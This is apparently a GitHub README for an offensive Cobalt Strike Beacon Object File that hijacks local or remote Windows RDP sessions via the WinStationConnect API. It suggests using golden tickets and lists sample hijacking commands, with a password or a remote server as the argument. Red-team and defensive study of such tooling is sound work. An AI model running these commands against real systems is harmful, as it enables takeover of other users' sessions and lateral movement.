# BOF - RDPHijack
----
Cobalt Strike Beacon Object File (BOF) that uses WinStationConnect API to perform local/remote RDP session hijacking. With a valid access token / kerberos ticket (e.g., golden ticket) of the session owner, you will be able to hijack the session remotely without dropping any beacon/tool on the target server.

To enumerate sessions locally/remotely, you could use [Quser-BOF](https://github.com/netero1010/Quser-BOF).

### Screenshot
![HowTo](https://github.com/netero1010/RDPHijack-BOF/raw/main/demo.png)

### Usage
```
Usage: bof-rdphijack [your console session id] [target session id to hijack] [password|server] [argument]

Command         Description
--------        -----------
password        Specifies the password of the user who owns the session to which you want to connect.
server          Specifies the remote server that you want to perform RDP hijacking.

Sample usage
--------
Redirect session 2 to session 1 (require SYSTEM privilege):
bof-rdphijack 1 2

Redirect session 2 to session 1 with password of the user who owns the session 2 (require high integrity beacon):
bof-rdphijack 1 2 password P@ssw0rd123

Redirect session 2 to session 1 for a remote server (require token/ticket of the user who owns the session 2):
bof-rdphijack 1 2 server SQL01.lab.internal
```

### Compile
`make`

### Reference
tscon.exe